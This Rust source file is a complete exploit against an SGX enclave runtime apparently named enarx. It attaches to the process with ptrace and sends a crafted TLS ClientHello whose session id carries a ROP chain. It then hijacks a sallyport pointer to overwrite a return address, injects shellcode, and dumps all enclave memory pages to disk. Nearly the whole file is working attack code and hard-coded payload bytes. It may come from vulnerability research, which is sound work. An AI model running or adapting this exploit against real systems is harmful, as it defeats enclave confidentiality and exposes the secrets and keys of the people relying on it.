use std::{env::args, io::Write, net::TcpStream, time::Duration};

use anyhow::{Context, Result};
use nix::{libc::pid_t, unistd::Pid};
use tracee::Tracee;
use tracing::{debug, error, info, trace};

use crate::ropchain::RopChain;

mod ropchain;
mod tracee;

fn main() -> Result<()> {
    tracing_subscriber::fmt::init();

    let mut args = args();
    let program = args.next().unwrap();
    let pid = args
        .next()
        .with_context(|| format!("usage: {program} <PID>"))?;
    let pid: pid_t = pid.parse().context("PID must be an integer")?;

    let pid = Pid::from_raw(pid);
    let mut tracee = Tracee::attach(pid)?;
    tracee.clear_breakpoints();

    // Inject and start executing shell code in the enclave.
    inject(&mut tracee).context("failed to infect the enclave")?;

    // Communicate with the shellcode running in the enclave to dump the memory.
    loot(&mut tracee)?;

    Ok(())
}

/// Inject and start executing shell code in the enclave.
fn inject(tracee: &mut Tracee) -> Result<()> {
    let path = tracee.find_exe_path()?;
    info!(%path, "Located executable");

    let enarx_base_address = tracee.find_base_address(&path)?;
    info!(enarx_base_address, "Located enarx base address");

    let sgx_base_address = tracee.find_base_address("/dev/sgx_enclave")?;
    info!(sgx_base_address, "Located sgx base address");

    let fake_stack = tracee.allocate_memory(enarx_base_address, 0x400000)?;
    info!(fake_stack, "Allocate fake stack");

    // Prepare a rop chain.
    let rop_stack_start = fake_stack + 0x200000;
    let mut rop_chain = RopChain::new(sgx_base_address, rop_stack_start);
    // Write the shellcode to some arbitrary address.
    let shellcode_addr = sgx_base_address + 0xd646000;
    for (i, b) in SHELLCODE.iter().copied().enumerate() {
        rop_chain.write(shellcode_addr + i as u64, b as u64);
    }
    // Change the protection flags for the shell code.
    rop_chain.mprotect(shellcode_addr, 0x1000, 5);
    // Pivot to the enclave stack and execute the shell code.
    rop_chain.on_enclave_stack(|chain| {
        chain.raw_return_address(shellcode_addr);
    });
    // If the shell code exits, just hang.
    rop_chain.hang();

    // Write the rop chain to the fake stack.
    for (i, fake_stack_value) in rop_chain.build_stack().enumerate() {
        tracee.poke_memory(rop_stack_start + 8 * (i as u64), &fake_stack_value)?;
    }

    info!("Creating breakpoint for `Thread::enter` start");
    let thread_enter_start_breakpoint = tracee.create_breakpoint(enarx_base_address + 0x135ffb)?;

    info!("Creating breakpoint for `Thread::enter` end");
    let thread_enter_end_breakpoint = tracee.create_breakpoint(enarx_base_address + 0x13600f)?;

    // A very short rop chain that pivots the stack to `rop_stack_start` where
    // we place a bigger rop chain.
    let mut short_rop_chain: [u8; 32] = [0; 32];
    short_rop_chain[0..8].copy_from_slice(&(sgx_base_address + 0x8356ec).to_ne_bytes());
    short_rop_chain[8..16].copy_from_slice(&rop_stack_start.to_ne_bytes());
    short_rop_chain[16..24].copy_from_slice(&(sgx_base_address + 0x8356e9).to_ne_bytes());

    // Connect to the server, start a TLS handshake and use rop chain as the
    // legacy session id. We do this because the server will echo the session
    // id back to us.
    std::thread::spawn(move || {
        if let Err(e) = start_tls_handshake(short_rop_chain) {
            error!(?e);
        }
    });

    // The last pointer to the sallyport block.
    let mut last_sallyport_block = None;
    // The last pointer to the run structure passed in to the vdso function.
    let mut last_run = None;
    let mut cssa: u32 = 1;

    // A counter used to keep track of when we should manipulate the passed in
    // sallyport pointer.
    let mut countdown: Option<u32> = None;

    loop {
        if thread_enter_start_breakpoint.was_hit() {
            debug!(cssa, "`Thread::enter` start breakpoint was hit");

            let mut registers = tracee.peek_registers()?;
            trace!(?registers);

            // Record some pointer for use when the the end breakpoint is hit.
            last_run = Some(registers.r10);
            last_sallyport_block = Some(registers.rdi);

            // Decrease the countdown.
            if let Some(countdown_value) = countdown {
                debug!(countdown_value);
                if let Some(next_countdown) = countdown_value.checked_sub(1) {
                    countdown = Some(next_countdown);
                } else {
                    // The counter hit 0. We attack now!
                    info!("Attacking!");

                    // At this time, the shim will try to write the response to
                    // the `ClientHello` packet we sent in
                    // `start_tls_handshake`. We manipulate the sallyport block
                    // pointer so that the shim ends up writing the legacy
                    // session id echo field to a return address on its own
                    // stack.
                    registers.rdi = sgx_base_address + 0x3f8a68 - 0x84;
                    tracee.poke_registers(registers)?;

                    return Ok(());
                }
            }
        } else if thread_enter_end_breakpoint.was_hit() {
            debug!("`Thread::enter` end breakpoint was hit");

            let registers = tracee.peek_registers()?;
            trace!(?registers);

            if let Some(last_run) = last_run.take() {
                // Inspect the run function to keep track of the cssa.
                let mut function: u32 = 0;
                tracee
                    .peek_memory(last_run + 8, &mut function)
                    .context("failed to read function")?;
                trace!(?function);
                if function == 4 {
                    cssa -= 1;
                } else {
                    cssa += 1;
                }
                debug!(?cssa);
                assert!(cssa < 3);

                // The shim just finished executing a syscall.
                if cssa == 2 {
                    if let Some(last_sallyport_block) = last_sallyport_block.take() {
                        let mut memory = [0u64; 3];
                        tracee
                            .peek_memory(last_sallyport_block, &mut memory)
                            .context("failed to read sallyport block")?;

                        let item_type = memory[1];

                        debug!(?memory);

                        if item_type == 1 {
                            let nr = memory[2];
                            info!(nr, "Syscall");
                            if nr == 228 {
                                // The shim will try to write the response soon.
                                countdown = Some(7);
                            }
                        }
                    }
                }
            }
        }

        tracee.r#continue()?;
    }
}

/// The shellcode that we inject into the enclave.
/// ```assembly
#[doc = include_str!("shellcode.s")]
/// ```
const SHELLCODE: &[u8] = &[
    0x48, 0x81, 0xEC, 0x00, 0x30, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2,
    0x08, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x8B, 0x36, 0x48, 0x8D, 0xBC, 0x24, 0x00, 0x20, 0x00,
    0x00, 0x48, 0xC7, 0xC1, 0x00, 0x10, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00,
    0x00, 0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xB4, 0x24, 0x00, 0x20, 0x00, 0x00,
    0x48, 0xC7, 0xC2, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x05, 0xEB, 0xAC,
];

/// Communicate with the shellcode running in the enclave to dump the memory.
fn loot(tracee: &mut Tracee) -> Result<()> {
    std::fs::create_dir_all("dump")?;

    let addresses = tracee.find_mapped_addresses("/dev/sgx_enclave")?;

    for range in addresses {
        for addr in range
            .step_by(0x1000)
            // Skip the TCS. Reading the TCS causes a GPF.
            .filter(|addr| addr & 0xFFFF_FFFF != 0x3fc000)
        {
            // Intercept a read system call.
            tracee.intercept_syscall(|mut registers| {
                debug!(registers.orig_rax);

                // Check if we got a read syscall.
                if registers.orig_rax != 0 {
                    return None;
                }

                // Write the address we want to have dumped to the buffer.
                let _ = tracee.poke_memory(registers.rsi, &addr);
                // Set the return code to 8.
                registers.rax = 8;

                Some(registers)
            })?;

            // Intercept a write system call.
            let mut buffer: [u8; 4096] = [0; 4096];
            tracee.intercept_syscall(|mut registers| {
                debug!(registers.orig_rax);

                // Check if we got a write syscall with size 4096.
                if registers.orig_rax != 1 || registers.rdx != 4096 {
                    return None;
                }

                // Read the dumped memory.
                let _ = tracee.peek_memory(registers.rsi, &mut buffer);
                // Set the return code to 4096.
                registers.rax = 4096;

                Some(registers)
            })?;

            let addr = format!("{addr:016x}");
            std::fs::write(format!("dump/{addr}"), buffer)?;
            info!("Dumped memory at {addr}");
        }
    }

    Ok(())
}

fn start_tls_handshake(legacy_session_id: [u8; 32]) -> Result<()> {
    // Modify the legcay session id of `ClientHello` packet and send it to the
    // server.
    let mut bytes: [u8; 517] = [
        0x16, 0x03, 0x01, 0x02, 0x00, 0x01, 0x00, 0x01, 0xfc, 0x03, 0x03, 0x17, 0xe0, 0x58, 0xe4,
        0x12, 0xe9, 0x0b, 0x90, 0x15, 0xc6, 0x1a, 0xe5, 0x99, 0xa1, 0x4c, 0x20, 0x77, 0xfa, 0x8a,
        0x14, 0xbf, 0x5d, 0x47, 0x17, 0x80, 0xf0, 0x2a, 0xc9, 0x31, 0x73, 0x15, 0xc9, 0x20, 0xdd,
        0xe3, 0x36, 0xab, 0x2e, 0x2e, 0x8d, 0x8b, 0xe3, 0x25, 0x7b, 0x24, 0xf9, 0x77, 0x04, 0x8c,
        0x27, 0xcf, 0x46, 0x46, 0x26, 0x7f, 0xc5, 0xc8, 0xc1, 0xdd, 0x28, 0xa2, 0x20, 0xcf, 0x64,
        0x3a, 0x00, 0x3e, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0xc0, 0x2c, 0xc0, 0x30, 0x00, 0x9f,
        0xcc, 0xa9, 0xcc, 0xa8, 0xcc, 0xaa, 0xc0, 0x2b, 0xc0, 0x2f, 0x00, 0x9e, 0xc0, 0x24, 0xc0,
        0x28, 0x00, 0x6b, 0xc0, 0x23, 0xc0, 0x27, 0x00, 0x67, 0xc0, 0x0a, 0xc0, 0x14, 0x00, 0x39,
        0xc0, 0x09, 0xc0, 0x13, 0x00, 0x33, 0x00, 0x9d, 0x00, 0x9c, 0x00, 0x3d, 0x00, 0x3c, 0x00,
        0x35, 0x00, 0x2f, 0x00, 0xff, 0x01, 0x00, 0x01, 0x75, 0x00, 0x00, 0x00, 0x08, 0x00, 0x06,
        0x00, 0x00, 0x03, 0x6e, 0x75, 0x63, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00,
        0x0a, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e, 0x00, 0x19, 0x00, 0x18,
        0x33, 0x74, 0x00, 0x00, 0x00, 0x10, 0x00, 0x0e, 0x00, 0x0c, 0x02, 0x68, 0x32, 0x08, 0x68,
        0x74, 0x74, 0x70, 0x2f, 0x31, 0x2e, 0x31, 0x00, 0x16, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00,
        0x00, 0x31, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x2a, 0x00, 0x28, 0x04, 0x03, 0x05, 0x03, 0x06,
        0x03, 0x08, 0x07, 0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04, 0x08, 0x05,
        0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01, 0x03, 0x03, 0x03, 0x01, 0x03, 0x02, 0x04,
        0x02, 0x05, 0x02, 0x06, 0x02, 0x00, 0x2b, 0x00, 0x05, 0x04, 0x03, 0x04, 0x03, 0x03, 0x00,
        0x2d, 0x00, 0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20,
        0xaa, 0xe0, 0x55, 0xfc, 0x7e, 0x7c, 0x89, 0x62, 0x9c, 0xaa, 0xc0, 0x6e, 0xcf, 0x88, 0xa4,
        0x4c, 0xa0, 0x9a, 0x1c, 0xe1, 0xa7, 0x90, 0xac, 0xb6, 0x08, 0xc4, 0x40, 0x29, 0x85, 0xfb,
        0x6a, 0x79, 0x00, 0x15, 0x00, 0xc4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    bytes[44..][..32].copy_from_slice(&legacy_session_id);

    let mut socket =
        TcpStream::connect(("127.0.0.1", 8443)).context("failed to connect to server")?;
    socket.write_all(&bytes).context("failed to write bytes")?;
    socket.flush().context("failed to flush socket")?;

    // Keep the connection open.
    std::thread::sleep(Duration::from_secs(3600));

    Ok(())
}
